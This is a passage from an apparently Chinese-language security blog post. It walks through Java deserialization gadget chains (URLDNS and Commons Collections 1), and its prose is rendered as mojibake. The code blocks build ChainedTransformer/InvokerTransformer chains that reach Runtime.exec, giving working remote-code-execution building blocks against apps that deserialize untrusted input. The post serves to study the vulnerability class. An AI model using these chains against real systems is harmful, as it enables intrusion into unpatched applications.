class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> URLDNS.SilentURLStreamHandler();</span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">    URL u = <span class="keyword">new</span> URL((URL)<span class="keyword">null</span>, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    SilentURLStreamHandler() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jaråŒ…åç¼–è¯‘çœ‹ä¸å‡ºæç¤ºã€‚æˆ‘ä»¬åœ¨githubæºç ä¸Šåˆ™å¯ä»¥æ‰¾åˆ°ä½œè€…çš„è¯´æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br></pre></td></tr></table></figure><p>é…åˆä¸Šé¢çš„æºç ã€‚æˆ‘ä»¬çŸ¥é“è¿™é‡Œå®ƒæ–°å»ºäº†ä¸€ä¸ªå­ç±»SilentURLStreamHandlerç»§æ‰¿URLStreamHandlerã€‚é‚£å½“å®ƒåœ¨URLDNSpayloadé‡Œè°ƒç”¨putæ—¶æ˜¯ç›´æ¥è°ƒç”¨è‡ªå®šä¹‰çš„<code>getHostAddress</code>.è¿™ä¸ªæ–¹æ³•è¿”å›null.</p><p>è€Œå½“ååºåˆ—åŒ–æ‰§è¡Œæ—¶,å› ä¸ºè¿™é‡Œçš„SilentURLStreamHandlerå±æ€§è¢«è®¾ç½®ä¸ºtransientï¼Œ<strong>è€Œè¢«transientä¿®é¥°çš„å˜é‡æ— æ³•è¢«åºåˆ—åŒ–</strong>ï¼Œæ‰€ä»¥æœ€ç»ˆååºåˆ—åŒ–è¯»å–å‡ºæ¥çš„transientä¾æ—§æ˜¯å…¶åˆå§‹å€¼ï¼Œä¹Ÿå°±æ˜¯URLStreamHandlerã€‚</p><p>åˆ°æ­¤ä¸ºæ­¢ã€‚æˆ‘ä»¬å®Œæˆäº†æ•´æ¡urldnsé“¾çš„åˆ†æã€‚<br>gadgetså¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject</span><br><span class="line">    HashMap#hash</span><br><span class="line">        URL#hashCode</span><br><span class="line">        URLStreamHandler#hashCode</span><br><span class="line">        URLStreamHandler#getHostAddress</span><br></pre></td></tr></table></figure><ul><li>CommonCollections1</li></ul><p>å…ˆè¯´ä¸‹ç¯å¢ƒçš„é…ç½®é—®é¢˜ã€‚å› ä¸ºccé“¾å­å¥½å‡ æ¡éƒ½åªèƒ½ç”¨åœ¨jdk1.7ä¸‹äº†æ‰€ä»¥å¾—å¼„ä¸ªjdk1.7çš„ç¯å¢ƒã€‚å¼€å§‹æ‰“ç®—ç”¨kaliè™šæ‹Ÿæœºç°æˆçš„çš„jvmé‡Œçš„1.7,ç»“æœå› ä¸ºå®˜æ–¹åº“å·²ç»æ²¡æœ‰openjdk7äº†ï¼Œideaè¯†åˆ«ä¸åˆ°ã€‚æ‰€ä»¥åªå¥½åˆä¸‹äº†ä¸€ä¸ªjdk1.7.</p><p>å› ä¸ºåªæ˜¯é¡¹ç›®ç”¨ï¼Œæ‰€ä»¥ä¸éœ€è¦æ·»åŠ ç¯å¢ƒå˜é‡ä»€ä¹ˆçš„å°±å¯ä»¥äº†ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ideaé¡¹ç›®åˆ‡æ¢jdkç‰ˆæœ¬çš„è¯,å°¤å…¶å¯¹äºæˆ‘ä»¬mavené¡¹ç›®è€Œè¨€,ä¸€å®šè¦æŠŠè®¾ç½®é‡Œæ‰€æœ‰é»˜è®¤å€¼éƒ½æ”¹ä¸ºjdk1.7.åŒ…æ‹¬ï¼špom.xmlé‡Œjava versionä¸maven ç¼–è¯‘version;project structureé‡Œproject sdk ä»¥åŠmodules;Language level;java Compiler version å…¨éƒ¨è°ƒæ•´ä¸º1.7æ‰èƒ½ä¸å‡ºé”™ã€‚<br>å¦åˆ™ä¼šåœ¨ç¼–è¯‘æ—¶æŠ¥<code>æ— æ•ˆçš„æº</code>ä»¥åŠç¼–è¯‘å®Œå<code>æ— æ•ˆçš„ç›®æ ‡å‘è¡Œç‰ˆ</code>è¿™ä¸¤ç§é”™ã€‚<br>ä¿®æ”¹å¥½åå°±æ²¡æœ‰ä»€ä¹ˆå¥½æ‹…å¿ƒçš„äº†ã€‚å¼€å§‹mavenå¯¼åº“å®¡è®¡å§ã€‚<br>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå…³äºåŠ¨æ€ä»£ç†çš„ä¾‹å­ã€‚</p><blockquote><p>1.javaä¸­ä»£ç†ç±»çš„ä½œç”¨æ˜¯:è°ƒç”¨ä¸å¯ä»¥ç›´æ¥è¢«å®ä¾‹åŒ–çš„æ¥å£æ–¹æ³•ã€‚<br>2.åŠ¨æ€ä»£ç†å¯ä»¥ç›´æ¥â€åˆ›å»ºâ€æŸä¸ªæ¥å£çš„å®ä¾‹ï¼Œå¯¹å…¶æ–¹æ³•è¿›è¡Œè°ƒç”¨.<br>3.è°ƒç”¨æŸä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè§¦å‘ä»£ç†ç±»çš„invokeæ–¹æ³•.</p></blockquote><p>å…ˆå®šä¹‰ä¸€ä¸ªæ¥å£ã€‚å®ƒæœ‰ä¸€ä¸ªhelloworldæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">helloworld</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è°ƒç”¨è¿™ä¸ªexpã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªhandler.å®ƒå®ç°äº†InvocationHandlerè¿™ä¸ªæ¥å£ã€‚åŒæ—¶éœ€è¦é‡å†™invokeæ–¹æ³•ã€‚æ­¤å¤„æˆ‘ä»¬è®©ä»–åœ¨æ–¹æ³•åä¸ºhelloworldæ—¶è¾“å‡ºè‡ªå®šä¹‰å†…å®¹<br>ç„¶åå®ä¾‹åŒ–ä¸€ä¸ªä»£ç†å¯¹è±¡hello.ä»–éœ€è¦ClassLoader,è¦ä»£ç†çš„æ¥å£æ•°ç»„ä»¥åŠè°ƒç”¨æ¥å£æ—¶è§¦å‘çš„å¯¹åº”æ–¹æ³•ä½œä¸ºæ„é€ å‚æ•°ã€‚<br>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> InvocationHandler()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"helloworld"</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Hello, "</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Hello<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">handler</span>)</span>;</span><br><span class="line">        hello.helloworld(<span class="string">"byc_404"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨æ¥å£çš„helloworldæ—¶ã€‚å°±ä¼šè§¦å‘invokeæ–¹æ³•é‡Œçš„å†…å®¹ã€‚<br>è¾“å‡º<code>Hello, byc_404</code></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹cc1é“¾å­çš„å†…å®¹ã€‚é¦–å…ˆä»æ‰§è¡Œå‘½ä»¤çš„åå°„gadgetå¼€å§‹ã€‚è¿™é‡Œæˆ‘ç¡®è®¤è¿‡ä¸€éï¼Œåº”è¯¥æ˜¯ç¬¬ä¸€éƒ¨åˆ†è·ŸCC5æ—¶å°±çœ‹è¿‡äº†ã€‚ç»“æœç°åœ¨å·²ç»å¿˜å…‰äº†â€¦â€¦æ‰€ä»¥å†çœ‹ä¸€éã€‚</p><p>é¦–å…ˆæ˜¯commonscollectionsè¿™ä¸ªåŒ…é‡ŒTrandsformerè¿™ä¸ªæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒå®ç°äº†ç±»å‹è½¬æ¢çš„åŠŸèƒ½ã€‚å…¶ä¸­å®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»ä¸»è¦æœ‰ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åé¢æ„é€ payloadè¦ç”¨åˆ°çš„.</p><blockquote><p>InvokerTransformer<br>ConstantTransformer<br>ChainedTransformer<br>ä»–ä»¬éƒ½å®ç°äº† Transformer ä»¥åŠ Serializableæ¥å£ã€‚</p></blockquote><p>çœ‹ä¸‹ä»–ä»¬çš„transformæ–¹æ³•<br>InvokeTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªéå¸¸å…¸å‹çš„åå°„è°ƒç”¨æ–¹æ³•çš„åŠŸèƒ½</p><p>ConstantTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿”å›æŸå‚æ•°ã€‚å¦‚æœå»çœ‹äº†å®ƒçš„æ„é€ æ–¹æ³•å°±ä¼šå‘ç°å…¶å®transformæ˜¯ä¸€ä¸ªåŸå°ä¸åŠ¨è¿”å›çš„åŠŸèƒ½ã€‚</p><p>ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸€ä¸ªforå¾ªç¯è¿›è¡Œå¾ªç¯è°ƒç”¨ã€‚å¯¹æ¯ä¸ªä¼ å…¥çš„transformeréƒ½è°ƒç”¨å…¶transformæ–¹æ³•å¹¶ä½œä¸ºä¸‹ä¸€æ¬¡çš„å‚æ•°ã€‚</p><p>å¦‚æœç›´æ¥æŠ½è±¡ç‚¹ç†è§£ï¼Œå¤§æ¦‚æ˜¯èƒ½ç†è§£ä¸‹é¢çš„expçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä½“ä¸Šæ˜¯ä¸€ä¸ªChainedTransformerå¾ªç¯è°ƒç”¨transformçš„è¿‡ç¨‹ã€‚å…¶ä¸­ConstantTransformerè·å–åˆ°Runtimeçš„ç±»ï¼Œåé¢å¾ªç¯è°ƒç”¨äº†ä¸‰ä¸ªinvokeè·å–æ–¹æ³•æ‰§è¡Œã€‚</p><p>ä¸‹é¢ç»†èŠ‚åŒ–çš„è§£é‡Šä¸‹.æ¯•ç«Ÿccé“¾å­æ‰€æœ‰å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†éƒ½æ˜¯è¿™æ¡é“¾(æ²¡è®°é”™çš„è¯)</p><p>å…ˆè¯´InvokeTransformerçš„transformæ–¹æ³•ã€‚ä¸Šé¢æºç é‡Œè¯´æ˜äº†å®ƒä¸»è¦æ˜¯ä¸€ä¸ªåå°„çš„è¿‡ç¨‹ã€‚å…¶æ¥å—çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>æœ€å¤§çš„å¥½å¤„å°±æ˜¯è¿™é‡Œæ‰€æœ‰åå°„å‚æ•°éƒ½æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å…¶å®è¿™é‡Œå°±èƒ½rce.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">Transformer invoketransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;);</span><br><span class="line">invoketransformer.transform(runtime);</span><br></pre></td></tr></table></figure><p>åªä¸è¿‡æ˜¾ç„¶æˆ‘ä»¬æ²¡æœ‰ç›´æ¥ä¼ å…¥ä¸€ä¸ª<code>Runtime.getRuntime()</code>è¿™æ ·ä¸€ä¸ªå®ä¾‹çš„å¯èƒ½ã€‚æ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸€ä¸‹å…¶ä»–çš„ç±»ä½œè¾…åŠ©ã€‚</p><p>æ¯”å¦‚è¯´ä¸Šé¢æåˆ°çš„ConstantTransformer.å…¶transformæ–¹æ³•ä¼šè¿”å›è‡ªèº«ã€‚æ‰€ä»¥è¯´å¯ä»¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object constantTransformer = <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()).transform(<span class="number">123</span>);</span><br><span class="line">Transformer invoketransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;);</span><br><span class="line">invoketransformer.transform(constantTransformer);</span><br></pre></td></tr></table></figure><p>å†åŠ ä¸ŠChainedTransformä¼šè°ƒç”¨å…¶è¾“å…¥çš„transformè¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥æ¥åˆ°ccåå°„expçš„é›å½¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">chain.transform(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å·²ä¸å†éœ€è¦è¾“å…¥å˜é‡ä¸ºå¯¹è±¡ï¼Œè€Œæ˜¯å¯ä»¥ä¸ºä»»æ„å€¼(æ­¤å¤„ä¸º123)ã€‚</p><p>åªä¸è¿‡è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ›¾ç»è¯´è¿‡</p><blockquote><p>javaååºåˆ—æŸç±»æ—¶,è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„</p></blockquote><p>æ­¤å¤„Runtime.getRuntime()è¿˜æ˜¯è¿”å›äº†runtimeå¯¹è±¡ï¼Œå®ƒä¸æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å³ååºåˆ—åŒ–æ—¶ä¸Šè¿°expä¼šæŠ¥é”™æŠ›å‡ºNotSerializableExceptionã€‚</p><p>å½“ç„¶è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¸å…è®¸ç›´æ¥è·å–çš„è¯ï¼Œç›´æ¥åŠ¨æ€è°ƒç”¨å°±å¥½äº†ã€‚ä¹Ÿå°±æ˜¯ç»§ç»­ç”¨åå°„è·å–Runtime.<br>æ‰€ä»¥æ‰æœ‰äº†æœ€å®Œæ•´çš„expä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">    new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">           